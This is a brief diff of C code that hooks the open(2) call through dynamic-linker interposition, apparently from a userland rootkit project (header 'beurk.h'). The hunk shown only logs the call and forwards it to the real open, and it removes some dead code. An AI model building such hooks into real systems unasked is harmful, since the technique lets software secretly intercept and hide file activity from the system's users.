@@ -23,7 +23,6 @@
 */
 
 #include <string.h>
-#define _GNU_SOURCE /* for RTLD_NEXT macro in dlfcn.h */
 #include <dlfcn.h>
 
 /**
@@ -31,7 +30,6 @@
 */
 #include <sys/types.h>
 #include <sys/stat.h>
-#include <fcntl.h>
 
 #include <stdarg.h>
 #include "beurk.h"
@@ -41,13 +39,8 @@ int open(const char *pathname, int flag, ...) {
     int        mode;
 
     DEBUG("call open(2) hooked");
-    return 0;
-    return (int)REAL_OPEN(pathname, flag);
     va_start(ap, flag);
     mode = va_arg(ap, int);
     va_end(ap);
-    if (mode)
-        return (int)REAL_OPEN(pathname, flag, mode);
-    else
-        return (int)REAL_OPEN(pathname, flag);
+    return (int)REAL_OPEN(pathname, flag, mode);
 }
